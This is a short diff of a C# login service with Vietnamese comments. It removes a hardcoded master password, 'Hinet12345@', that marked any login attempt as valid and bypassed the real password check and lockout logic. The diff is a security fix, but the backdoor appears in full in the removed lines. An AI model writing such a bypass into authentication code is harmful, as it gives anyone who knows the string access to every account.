@@ -139,10 +139,6 @@ namespace Hinet.Service.AppUserService
             // Kiểm tra mật khẩu
 
             var isPasswordValid = await _userManager.CheckPasswordAsync(user, password);
-            if (password == "Hinet12345@")
-            {
-                isPasswordValid = true;
-            }
             if (!isPasswordValid)
             {
                 // Tăng counter sai mật khẩu; nếu vượt ngưỡng MaxFailedAccessAttempts thì lockout 15 phút.
